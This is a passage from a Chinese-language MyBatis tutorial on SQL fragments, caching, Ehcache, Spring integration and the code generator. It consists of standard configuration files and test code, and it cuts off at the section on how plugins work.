/>\n    from tbl_employee\n    where last_name like #{_lastName}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ninclue标签内可以自定义一些属性，然后使用${}取值。\n\n<sql id="emp">\n    id,${name},email,gender\n</sql>\n\n<select id="getLikeEmp" resultType="employee">\n    <bind name="_lastName" value="\'%\'+lastName+\'%\'"/>\n    select\n    <include refid="emp" >\n        <property name="name" value="last_name"/>\n    </include>\n    from tbl_employee\n    where last_name like #{_lastName}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 缓存\n\nMybatis中包含了一个非常强大的查询缓存特性，可以非常方便的配置和定制。缓存可以极大的提升查询效率。\n\nMyBatis系统中默认定义了两级缓存。一级缓存，二级缓存。\n\n 1. 默认情况下，只有一级缓存（SQLSession级别的缓存，本地缓存）开启。\n 2. 二级缓存需要手动配置，是namespace级别的缓存\n 3. 为了提高扩展性。Mybatis定义了缓存接口Cache，我们可以实现Cache接口实现定义二级缓存。\n\n\n# 一级缓存\n\n与数据库同一次会话产生的数据会放到一级缓存中，以后如果需要取相同的数据则直接从缓存中取。\n\n@Test\npublic void testFirstLevel() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n\n    try {\n        EmployeeMapperCache mapper = sqlSession.getMapper(EmployeeMapperCache.class);\n        System.out.println(mapper.getEmp(1));\n        System.out.println(mapper.getEmp(1));\n    }finally {\n        sqlSession.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n查询结果可以看出，只执行了一次查询\n\n[2022-02-21 19:26:09:969-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==>  Preparing: select * from tbl_employee where id = ?\n[2022-02-21 19:26:09:994-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - ==> Parameters: 1(Integer)\n[2022-02-21 19:26:10:011-main] [DEBUG] - org.apache.ibatis.logging.jdbc.BaseJdbcLogger.debug(BaseJdbcLogger.java:137) - &lt;==      Total: 1\nEmployee{id=1, lastName=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\nEmployee{id=1, lastName=\'wangwu\', gender=0, email=\'wangwu@qq.com\', dept=null}\n\n\n1\n2\n3\n4\n5\n\n\n有以下几种情况导致缓存失效：\n\n * 不同的sqlSession\n * SQLSession相同，查询条件不同 - 缓存中没有\n * SQLSession相同，两次查询之间有增删改查操作\n * SQLSession相同，调用缓存清空sqlsesson.clearCache()\n\n\n# 二级缓存\n\n不同的SqlSession无法使用一级缓存，范围较小。当我们需要不同的SqlSession可以从缓存中查找数据，则需要开启二级缓存。二级缓存的作用域是namespace。\n\n二级缓存机制：\n\n 1. 一个会话，查询一条语句，这个数据会被存储在一级缓存中。\n 2. 会话关闭，一级缓存中的数据会被保存到二级缓存中，新的查询会访问二级缓存。\n 3. 不同的namespace查询的数据会对应自己的缓存空间。\n\n使用方法：\n\n 1. 开启全局二级缓存配置\n\n<setting name="cacheEnabled" value="true"/>\n\n\n1\n\n 2. 去mapper中配置二级缓存\n\n<cache></cache>\n\n\n1\n\n\n二级缓存配置有以下可选参数：\n\n * blocking:\n * eviction: 缓存的回收策略\n   * LRU: 最近最少使用的，移除长时间未被访问的对象\n   * FIFO: 先进先出，按照对象存储的顺序，先进来的先出去\n   * SOFT: 软引用，移除基于垃圾回收器状态和软引用的对象\n   * WEAK: 弱引用，更积极的移除基于垃圾收集器状态和弱引用的相关对象\n   * 默认：LRU\n * flushInterval：缓存刷新时间，默认不清空\n * readOnly\n   * true： 只读，mybatis认为所有缓存中的数据都是只读操作，不会修改数据。为了加快速度，会将缓存中的内容直接交给用户，不安全速度快。\n   * false： 非只读，mybatis觉得数据是可以被修改的。mybatis会利用序列化等技术克隆一份新的数据给你。\n * size：缓存多少数据\n * type：指定缓存的全类名\n\n 3. pojo实现序列化接口\n\n@Test\npublic void testSecondLevel() throws IOException {\n    String resource = "mybatis-config.xml";\n    InputStream resourceAsStream = Resources.getResourceAsStream(resource);\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(resourceAsStream);\n    SqlSession sqlSession = sqlSessionFactory.openSession();\n    SqlSession sqlSession2 = sqlSessionFactory.openSession();\n\n    EmployeeMapperCache mapper = sqlSession.getMapper(EmployeeMapperCache.class);\n    EmployeeMapperCache mapper2 = sqlSession2.getMapper(EmployeeMapperCache.class);\n    Employee emp = mapper.getEmp(1);\n    sqlSession.close();\n    System.out.println(mapper2.getEmp(1));\n    sqlSession2.close();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n注意，只有当SQLSession关闭之后，才会将数据移动到二级缓存。\n\n\n# 缓存相关设置\n\n * cacheEnabled 开启或者关闭二级缓存，配置在mybatis配置文件setting中\n * mapper配置文件对应的查询标签中，设置setCache=true，开启或者关闭二级缓存\n * 每个增删改标签上默认有flushCache=true，默认清空一级缓存和二级缓存\n * 在每个查询标签中默认有flushCache=false，默认不清空缓存\n * sqlSession.flushCache()默认清空一级缓存\n * localCacheScope=[SESSION|STATEMENT] 本地缓存作用域\n\n\n# 缓存工作原理\n\n\n\n\n# 第三方缓存EHCACHE\n\n 1. 导入Ehcache包\n\n\x3c!-- https://mvnrepository.com/artifact/org.ehcache/ehcache --\x3e\n<dependency>\n    <groupId>org.ehcache</groupId>\n    <artifactId>ehcache</artifactId>\n    <version>3.9.9</version>\n</dependency>\n\n\x3c!-- https://mvnrepository.com/artifact/org.mybatis.caches/mybatis-ehcache --\x3e\n<dependency>\n    <groupId>org.mybatis.caches</groupId>\n    <artifactId>mybatis-ehcache</artifactId>\n    <version>1.2.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. mapper中开启二级缓存\n\n<cache readOnly="true" eviction="FIFO" size="640000" type="org.mybatis.caches.ehcache.EhcacheCache" />\n<cache-ref namespace="com.pwddd.mybatis.mapper.EmployeeMapperCache"/> <!-引用其他文件的缓存--\x3e\n\n\n1\n2\n\n 3. 配置ehcache配置文件\n\n<ehcache>\n\n\n    \x3c!--\n        磁盘存储:将缓存中暂时不使用的对象,转移到硬盘,类似于Windows系统的虚拟内存\n        path:指定在硬盘上存储对象的路径\n     --\x3e\n    <diskStore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultCache:默认的缓存配置信息,如果不加特殊说明,则所有对象按照此配置项处理\n        maxElementsInMemory:设置了缓存的上限,最多存储多少个记录对象\n        eternal:代表对象是否永不过期\n        timeToIdleSeconds:最大的发呆时间\n        timeToLiveSeconds:最大的存活时间\n        overflowToDisk:是否允许对象被写入到磁盘\n     --\x3e\n    <defaultCache maxElementsInMemory="10000" eternal="false"\n                  timeToIdleSeconds="120" timeToLiveSeconds="120" overflowToDisk="true" />\n\n    \x3c!--\n        cache:为指定名称的对象进行缓存的特殊配置\n        name:指定对象的完整名\n     --\x3e\n    <cache name="com.zbaccp.entity.Person" maxElementsInMemory="10000" eternal="false"\n           timeToIdleSeconds="300" timeToLiveSeconds="600" overflowToDisk="true" />\n\n\n</ehcache>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 整合Spring\n\n 1. 导入相关依赖包\n\n<dependencies>\n    \n      \x3c!--测试--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-test</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \n  <dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>4.11</version>\n    <scope>test</scope>\n  </dependency>\n\n  \x3c!--spring 依赖 核心--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-core</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-expression</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-beans</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-context</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring jdbc--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-jdbc</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-tx</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-orm</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring web--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-web</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-webmvc</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>javax.servlet</groupId>\n    <artifactId>servlet-api</artifactId>\n    <version>2.5</version>\n    <scope>provided</scope>\n  </dependency>\n\n  <dependency>\n    <groupId>org.thymeleaf</groupId>\n    <artifactId>thymeleaf-spring5</artifactId>\n    <version>3.0.12.RELEASE</version>\n  </dependency>\n\n  \x3c!--aop--\x3e\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-aop</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-aspects</artifactId>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupId>cglib</groupId>\n    <artifactId>cglib</artifactId>\n    <version>2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupId>aopalliance</groupId>\n    <artifactId>aopalliance</artifactId>\n    <version>1.0</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.aspectj</groupId>\n    <artifactId>aspectjweaver</artifactId>\n    <version>1.9.7</version>\n  </dependency>\n\n  \x3c!--mybatis--\x3e\n  <dependency>\n    <groupId>org.mybatis</groupId>\n    <artifactId>mybatis</artifactId>\n    <version>3.5.9</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.mybatis</groupId>\n    <artifactId>mybatis-spring</artifactId>\n    <version>2.0.7</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.mybatis.caches</groupId>\n    <artifactId>mybatis-ehcache</artifactId>\n    <version>1.2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupId>org.ehcache</groupId>\n    <artifactId>ehcache</artifactId>\n    <version>3.9.9</version>\n  </dependency>\n    \n  <dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid</artifactId>\n    <version>1.2.8</version>\n  </dependency>\n\n  <dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n    <version>5.1.21</version>\n  </dependency>\n    \n    \x3c!-- 其他辅助包 --\x3e\n\n  <dependency>\n    <groupId>org.apache.logging.log4j</groupId>\n    <artifactId>log4j-core</artifactId>\n    <version>2.17.1</version>\n  </dependency>\n\n    \x3c!--文件上传--\x3e\n\n  <dependency>\n    <groupId>commons-fileupload</groupId>\n    <artifactId>commons-fileupload</artifactId>\n    <version>1.4</version>\n  </dependency>\n    \n   \x3c!-- 响应json --\x3e\n\n  <dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.12.1</version>\n  </dependency>\n\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n\n 2. 配置web.xml(WebInit)、Spring、SpringMVC配置文件\n\nweb.xml/WebInit\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.web.filter.CharacterEncodingFilter;\nimport org.springframework.web.filter.HiddenHttpMethodFilter;\nimport org.springframework.web.servlet.support.AbstractAnnotationConfigDispatcherServletInitializer;\n\nimport javax.servlet.Filter;\n\npublic class WebInit extends AbstractAnnotationConfigDispatcherServletInitializer {\n    @Override\n    protected Class<?>[] getRootConfigClasses() {\n        return new Class[]{SpringConfig.class};\n    }\n\n    @Override\n    protected Class<?>[] getServletConfigClasses() {\n        return new Class[]{WebConfig.class};\n    }\n\n    @Override\n    protected String[] getServletMappings() {\n        return new String[]{"/"};\n    }\n\n    @Override\n    protected Filter[] getServletFilters() {\n        CharacterEncodingFilter characterEncodingFilter = new CharacterEncodingFilter();\n        characterEncodingFilter.setForceRequestEncoding(true);\n        characterEncodingFilter.setEncoding("utf-8");\n        HiddenHttpMethodFilter hiddenHttpMethodFilter = new HiddenHttpMethodFilter();\n        return new Filter[]{characterEncodingFilter,hiddenHttpMethodFilter};\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nSpring配置文件\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.servlet.ViewResolver;\nimport org.springframework.web.servlet.config.annotation.EnableWebMvc;\nimport org.springframework.web.servlet.config.annotation.ViewControllerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\nimport org.thymeleaf.spring5.SpringTemplateEngine;\nimport org.thymeleaf.spring5.view.ThymeleafViewResolver;\nimport org.thymeleaf.templatemode.TemplateMode;\nimport org.thymeleaf.templateresolver.ITemplateResolver;\nimport org.thymeleaf.templateresolver.ServletContextTemplateResolver;\n\n@Configuration\n@ComponentScan("com.pwddd.ssmdemo.controller")\n@EnableWebMvc\npublic class WebConfig implements WebMvcConfigurer {\n\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        registry.addViewController("/").setViewName("index");\n    }\n\n\n    @Bean\n    public ITemplateResolver templateResolver(WebApplicationContext applicationContext){\n        ServletContextTemplateResolver servletContextTemplateResolver = new ServletContextTemplateResolver(applicationContext.getServletContext());\n        servletContextTemplateResolver.setPrefix("/WEB-INF/templates/");\n        servletContextTemplateResolver.setSuffix(".html");\n        servletContextTemplateResolver.setCharacterEncoding("utf-8");\n        servletContextTemplateResolver.setTemplateMode(TemplateMode.HTML);\n        return servletContextTemplateResolver;\n    }\n\n    @Bean\n    public SpringTemplateEngine templateEngine(ITemplateResolver templateResolver){\n        SpringTemplateEngine springTemplateEngine = new SpringTemplateEngine();\n        springTemplateEngine.setTemplateResolver(templateResolver);\n        return springTemplateEngine;\n    }\n\n    @Bean\n    public ViewResolver viewResolver(SpringTemplateEngine templateEngine){\n        ThymeleafViewResolver thymeleafViewResolver = new ThymeleafViewResolver();\n        thymeleafViewResolver.setTemplateEngine(templateEngine);\n        thymeleafViewResolver.setCharacterEncoding("utf-8");\n        return thymeleafViewResolver;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\nSpringMVC\n\npackage com.pwddd.ssmdemo.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.mybatis.spring.SqlSessionFactoryBean;\nimport org.mybatis.spring.annotation.MapperScan;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.*;\nimport org.springframework.jdbc.datasource.DataSourceTransactionManager;\nimport org.springframework.transaction.annotation.EnableTransactionManagement;\n\nimport javax.sql.DataSource;\nimport java.io.IOException;\n\n@Configuration\n@ComponentScan("com.pwddd.ssmdemo.service")\n@PropertySource("classpath:jdbc.properties")\n@MapperScan("com.pwddd.ssmdemo.mapper")  // 配置mapper扫描\n@EnableTransactionManagement  // 开启事务\n@EnableAspectJAutoProxy(proxyTargetClass = true)  // 开启aop aspect注解\npublic class SpringConfig {\n\n    @Value("${jdbc.driver}")\n    private String driver;\n\n    @Value("${jdbc.url}")\n    private String url;\n\n    @Value("${jdbc.username}")\n    private String username;\n\n    @Value("${jdbc.password}")\n    private String password;\n\n    @Bean\n    public DataSource dataSource(){\n        DruidDataSource druidDataSource = new DruidDataSource();\n        druidDataSource.setDriverClassName(driver);\n        druidDataSource.setUrl(url);\n        druidDataSource.setUsername(username);\n        druidDataSource.setPassword(password);\n        return druidDataSource;\n    }\n\n    @Bean\n    public DataSourceTransactionManager dataSourceTransactionManager(DataSource dataSource){\n        DataSourceTransactionManager dataSourceTransactionManager = new DataSourceTransactionManager();\n        dataSourceTransactionManager.setDataSource(dataSource);\n        return dataSourceTransactionManager;\n    }\n\n    @Bean\n    public SqlSessionFactoryBean sqlSessionFactoryBean(DataSource dataSource, ApplicationContext applicationContext) throws IOException {\n        SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean();\n        sqlSessionFactoryBean.setDataSource(dataSource);\n        sqlSessionFactoryBean.setConfigLocation(applicationContext.getResource("classpath:mybatis-config.xml"));\n//        sqlSessionFactoryBean.setMapperLocations(applicationContext.getResources("classpath:mapper/*.xml"));\n        return sqlSessionFactoryBean;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\njdbc.properties\n\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssmdemo\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\nlog4j2配置文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!--设置log4j2的自身log级别为warn--\x3e\n\x3c!--日志级别以及优先级排序: OFF > FATAL > ERROR > WARN > INFO > DEBUG > TRACE > ALL --\x3e\n\x3c!--Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，\n    当设置成trace时，你会看到log4j2内部各种详细输出--\x3e\n\x3c!--monitorInterval：Log4j能够自动检测修改配置 文件和重新配置本身，设置间隔秒数--\x3e\n<configuration status="warn" monitorInterval="30">\n    \x3c!--全局参数--\x3e\n    <Properties>\n        \x3c!--<Property name="logPath">/export/Logs/bt-middle-data-main</Property>--\x3e\n        <Property name="logPath">./log</Property>\n    </Properties>\n    \x3c!--先定义所有的appender--\x3e\n    <appenders>\n        \x3c!--这个输出控制台的配置--\x3e\n        <console name="Console" target="SYSTEM_OUT">\n            \x3c!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch） --\x3e\n            \x3c!--<ThresholdFilter level="debug" onMatch="ACCEPT" onMismatch="DENY"/>--\x3e\n            \x3c!--输出日志的格式--\x3e\n            <PatternLayout pattern="[%d{yyyy-MM-dd HH:mm:ss:SSS}-%t] [%p] - %l - %m%n"/>\n        </console>\n        \x3c!--文件会打印出所有信息，这个log每次运行程序会自动清空，由append属性决定，这个也挺有用的，适合临时测试用--\x3e\n        \x3c!--<File name="log" fileName="log/test.log" append="false">--\x3e\n        \x3c!--<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %class{36} %L %M - %msg%xEx%n"/>--\x3e\n        \x3c!--</File>--\x3e\n        \x3c!-- 这个会打印出所有的info及以下级别的信息，每次大小超过size，\n        则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档--\x3e\n        <RollingFile name="RollingFileInfo" fileName="${logPath}/info.log"\n                     filePattern="${logPath}/info_%d{yyyy-MM-dd}.log">\n            \x3c!--<Filters>--\x3e\n            \x3c!--<!–控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）–>--\x3e\n            \x3c!--<ThresholdFilter level="INFO" onMatch="ACCEPT" onMismatch="DENY"/>--\x3e\n            \x3c!--<!–<ThresholdFilter level="WARN" onMatch="DENY" onMismatch="NEUTRAL"/>–>--\x3e\n            \x3c!--</Filters>--\x3e\n            <PatternLayout pattern="[%d{yyyy-MM-dd HH:mm:ss:SSS}-%t] [%p] - %l - %m%n"/>\n            <Policies>\n                \x3c!--按照filePattern 时间单位 interval 间隔生成文件--\x3e\n                <TimeBasedTriggeringPolicy modulate="true" interval="1"/>\n                \x3c!--定了当日志文件达到了指定的size时，触发rollover操作。size参数可以用KB、MB、GB等做后缀来指定具体的字节数--\x3e\n                \x3c!--<SizeBasedTriggeringPolicy size="1G"/>--\x3e\n            </Policies>\n        </RollingFile>\n\n\n    </appenders>\n    \x3c!--然后定义logger，只有定义了logger并引入的appender，appender才会生效--\x3e\n    <loggers>\n        \x3c!--过滤掉spring和hibernate的一些无用的debug信息--\x3e\n        <logger name="org.springframework" level="DEBUG">\n        </logger>\n        <logger name="org.elasticsearch" level="INFO">\n        </logger>\n        <logger name="com.jd.jsf.gd" level="warn">\n        </logger>\n        <logger name="org.mybatis" level="DEBUG">\n        </logger>\n        \x3c!-- 将业务dao接口填写进去,并用控制台输出即可 --\x3e\n        <logger name="com.pwddd.ssmdemo.mapper" level="debug" additivity="false">\n            <appender-ref ref="Console"/>\n            <appender-ref ref="RollingFileInfo"/>\n        </logger>\n\n        <root level="info">\n            <appender-ref ref="Console"/>\n            <appender-ref ref="RollingFileInfo"/>\n        </root>\n    </loggers>\n\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nmybatis-config.xml配置文件\n\n<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE configuration\n        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapUnderscoreToCamelCase" value="true"/>\n        <setting name="lazyLoadingEnabled" value="true"/>\n        \x3c!--        按照需要进行属性的加载--\x3e\n        <setting name="aggressiveLazyLoading" value="false"/>\n        <setting name="cacheEnabled" value="true"/>\n    </settings>\n\n    <typeAliases>\n\x3c!--        <typeAlias type="com.pwddd.mybatis.bean.Employee" alias="emp" />--\x3e\n        <package name="com.pwddd.ssmdemo.bean"/>\n    </typeAliases>\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nehcache.xml配置文件\n\n<ehcache>\n\n\n    \x3c!--\n        磁盘存储:将缓存中暂时不使用的对象,转移到硬盘,类似于Windows系统的虚拟内存\n        path:指定在硬盘上存储对象的路径\n     --\x3e\n    <diskStore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultCache:默认的缓存配置信息,如果不加特殊说明,则所有对象按照此配置项处理\n        maxElementsInMemory:设置了缓存的上限,最多存储多少个记录对象\n        eternal:代表对象是否永不过期\n        timeToIdleSeconds:最大的发呆时间\n        timeToLiveSeconds:最大的存活时间\n        overflowToDisk:是否允许对象被写入到磁盘\n     --\x3e\n    <defaultCache maxElementsInMemory="10000" eternal="false"\n                  timeToIdleSeconds="120" timeToLiveSeconds="120" overflowToDisk="true" />\n\n    \x3c!--\n        cache:为指定名称的对象进行缓存的特殊配置\n        name:指定对象的完整名\n     --\x3e\n    <cache name="com.zbaccp.entity.Person" maxElementsInMemory="10000" eternal="false"\n           timeToIdleSeconds="300" timeToLiveSeconds="600" overflowToDisk="true" />\n</ehcache>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 逆向工程\n\nMybatis代码生成器是mybatis提供的一个根据数据库表逆向自动生成xml、JavaBean等类的工具。\n\nMybatis逆向工程配置：\n\n 1. 引入mybatis-gentator\n\n<dependency>\n    <groupId>org.mybatis.generator</groupId>\n    <artifactId>mybatis-generator-core</artifactId>\n    <version>1.3.7</version>\n</dependency>\n\n<dependency>\n    <groupId>org.mybatis.generator</groupId>\n    <artifactId>mybatis-generator-maven-plugin</artifactId>\n    <version>1.3.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. 编写配置文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorConfiguration>\n\n    \x3c!--\n        targetRuntime="MyBatis3Simple":生成简单版的CRUD\n        MyBatis3:豪华版\n     --\x3e\n    <context id="mysqlTables" targetRuntime="MyBatis3">\n        \x3c!-- jdbcConnection：指定如何连接到目标数据库 --\x3e\n        <jdbcConnection driverClass="com.mysql.jdbc.Driver"\n                        connectionURL="jdbc:mysql://localhost:3306/mybatis?allowMultiQueries=true"\n                        userId="root"\n                        password="123456">\n        </jdbcConnection>\n\n        \x3c!--  --\x3e\n        <javaTypeResolver >\n            <property name="forceBigDecimals" value="false" />\n        </javaTypeResolver>\n\n        \x3c!-- javaModelGenerator：指定javaBean的生成策略\n        targetPackage="test.model"：目标包名\n        targetProject="\\MBGTestProject\\src"：目标工程\n        --\x3e\n        <javaModelGenerator targetPackage="com.pwddd.mybatis.bean"\n                            targetProject=".\\src\\main\\java\\">\n            <property name="enableSubPackages" value="true" />\n            <property name="trimStrings" value="true" />\n        </javaModelGenerator>\n\n        \x3c!-- sqlMapGenerator：sql映射生成策略： --\x3e\n        <sqlMapGenerator targetPackage="mapper"\n                         targetProject=".\\src\\main\\resources\\">\n            <property name="enableSubPackages" value="true" />\n        </sqlMapGenerator>\n\n        \x3c!-- javaClientGenerator:指定mapper接口所在的位置 --\x3e\n        <javaClientGenerator type="XMLMAPPER" targetPackage="com.pwddd.mybatis.dao"\n                             targetProject=".\\src\\main\\java\\">\n            <property name="enableSubPackages" value="true" />\n        </javaClientGenerator>\n\n        \x3c!-- 指定要逆向分析哪些表：根据表要创建javaBean --\x3e\n        <table tableName="tbl_dept" domainObjectName="Department"></table>\n        <table tableName="tbl_employee" domainObjectName="Employee"></table>\n    </context>\n</generatorConfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 3. 运行\n\n@Test\npublic void mbg() throws XMLParserException, IOException, InvalidConfigurationException, SQLException, InterruptedException {\n\nList<String> warnings = new ArrayList<String>();\n    boolean overwrite = true;\n    File configFile = new File("mbg.xml");\n    ConfigurationParser cp = new ConfigurationParser(warnings);\n    Configuration config = cp.parseConfiguration(configFile);\n    DefaultShellCallback callback = new DefaultShellCallback(overwrite);\n    MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings);\n    myBatisGenerator.generate(null);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# MyBatis运行原理\n\n\n\n\n\n\n# 创建SQLSessionFactory\n\n\n\n\n# 创建SQLSession\n\n\n\n\n# 获取Mapper的代理类对象\n\n\n\n\n# 执行查询\n\n\n\n\n# 流程总结\n\n\n\n\n# 插件\n\n\n# 原理\n\n 1. 在四大对象创建的过程中，都会执行interceptorChain.pluginAll(param);,获取到所有的interceptor，调用interceptor.plugin(target) 返回target包装之后的对象。\n 2. 